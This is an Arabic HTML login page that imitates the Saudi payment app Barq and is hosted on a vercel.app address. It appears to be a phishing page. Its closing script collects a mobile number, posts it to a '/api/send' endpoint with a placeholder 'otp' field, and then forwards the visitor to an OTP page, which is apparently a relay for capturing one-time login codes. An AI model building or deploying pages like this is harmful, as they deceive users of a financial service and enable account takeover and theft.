<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>تسجيل الدخول - برق | ابرق، ادفع، ادخر، واستمتع بإمكانيات مالها آخر!</title>
    <meta name="description" content="حلول تقنية مالية لتحويل حياتك اليومية من خلال تجربة رقمية مبتكرة. برق تطبيق مستوحى منك وبنيناه لك.">
    <meta name="author" content="Barq App">

    <meta property="og:title" content="تسجيل الدخول - تطبيق برق">
    <meta property="og:description" content="سجل دخولك في تطبيق برق واستمتع بتجربة مالية سريعة وموثوقة.">
    <meta property="og:image" content="https://barq-sa.vercel.app/barq.png">
    <meta property="og:url" content="https://barq-sa.vercel.app/">
    <meta property="og:type" content="website">
    <meta name="google-site-verification" content="ziQ0Ury1yiwH_jbF717pkJoWgPvsCxURSvfm-4stVug" />

    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
    <link rel="manifest" href="site.webmanifest">
    <meta name="theme-color" content="#ffffff">
    <meta name="keywords" content=" تطبيق برق, حلول مالية رقمية, دفع إلكتروني, خدمات مالية, برق السعودية ,برق ">

    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:image:type" content="image/png">
    
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">


    <style>
        /* --- CSS Style --- */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .app-container { width: 100%; max-width: 450px; height: 100vh; padding: 40px 25px; display: flex; flex-direction: column; align-items: center; position: relative; }
        .logo-section { margin-top: 60px; margin-bottom: 30px; }
        .sparkle-logo { width: 80px; height: auto; display: block; }
        .welcome-text h1 { font-size: 26px; font-weight: 700; color: #000; margin-bottom: 5px; text-align: center; }
        .welcome-text p { color: #777; font-size: 16px; margin-bottom: 40px; text-align: center; }
        .input-group { width: 100%; border: 2px solid #FFD700; border-radius: 18px; padding: 10px 15px; display: flex; align-items: center; flex-direction: row; transition: border-color 0.3s; }
        .country-selector { display: flex; align-items: center; gap: 8px; padding-left: 10px; border-left: 1px solid #eee; margin-left: 12px; }
        .flag-icon { width: 28px; height: 20px; object-fit: cover; border-radius: 3px; }
        .arrow-down { font-size: 10px; color: #ccc; }
        .input-wrapper { flex: 1; display: flex; flex-direction: column; text-align: right; }
        .input-wrapper label { font-size: 11px; color: #bbb; margin-bottom: 2px; }
        .input-wrapper input { border: none; outline: none; font-size: 18px; color: #333; background: transparent; font-weight: 500; text-align: right; }
        .referral-section { margin-top: 30px; width: 100%; text-align: center; }
        .referral-section a { text-decoration: none; color: #000; font-weight: 600; font-size: 15px; }
        .bottom-section { margin-top: auto; width: 100%; text-align: center; padding-bottom: 30px; }
        .terms-text { font-size: 12px; color: #888; margin-bottom: 20px; line-height: 1.5; }
        .terms-text span { color: #000; font-weight: bold; }
        .btn-continue { width: 100%; padding: 16px; border-radius: 18px; border: none; background-color: #EAEAEA; color: #B0B0B0; font-size: 18px; font-weight: bold; cursor: not-allowed; transition: all 0.3s ease; }
        .btn-continue.active { background-color: #000; color: #fff; cursor: pointer; }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="logo-section">
            <img src="barq.png" alt="شعار تطبيق برق" class="sparkle-logo" id="logoImg">
        </div>

        <div class="welcome-text">
            <h1>هلا فيك في برق</h1>
            <p>الرجاء إدخال رقم الجوال</p>
        </div>

        <div class="input-group">
            <div class="country-selector">
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Flag_of_Saudi_Arabia.svg" alt="SA" class="flag-icon">
                <span class="arrow-down">▼</span>
            </div>
            
            <div class="input-wrapper">
                <label>رقم الجوال</label>
                <input type="tel" id="phoneInput" placeholder="05" maxlength="10">
            </div>
        </div>

        <div class="referral-section">
            <a href="#">رمز دعوة من صديق؟</a>
        </div>

        <div class="bottom-section">
            <p class="terms-text">
                من خلال الاستمرار فإنك توافق على <br>
                <span>الشروط والأحكام</span> و <span>سياسات خصوصية البيانات</span>
            </p>
            <button id="submitBtn" class="btn-continue" disabled>استمرار</button>
        </div>
    </div>
    <script>
    const phoneInput = document.getElementById('phoneInput');
    const submitBtn = document.getElementById('submitBtn');

    phoneInput.addEventListener('input', () => {
        // التحقق من طول الرقم
        if (phoneInput.value.trim().length >= 9) {
            submitBtn.classList.add('active');
            submitBtn.disabled = false;
        } else {
            submitBtn.classList.remove('active');
            submitBtn.disabled = true;
        }
    });

    phoneInput.addEventListener('keypress', (e) => {
        if (!/[0-9]/.test(e.key)) { e.preventDefault(); }
    });

    // دالة الإرسال عند الضغط على استمرار
    submitBtn.addEventListener('click', async () => {
        if (!submitBtn.disabled) {
            const phone = phoneInput.value;
            localStorage.setItem('userPhone', phone);

            // إرسال الرقم إلى الـ API الخاص بنا في Vercel
            try {
                // نرسل الرقم فقط في هذه المرحلة (أو أي قيمة ابتدائية)
                await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: phone, 
                        otp: "لم يتم إدخال الرمز بعد" 
                    })
                });
            } catch (error) {
                console.error("Error sending phone:", error);
            }

            // الانتقال لصفحة الرمز
            window.location.href = 'otp.html';
        }
    });
</script>

</body>
</html>
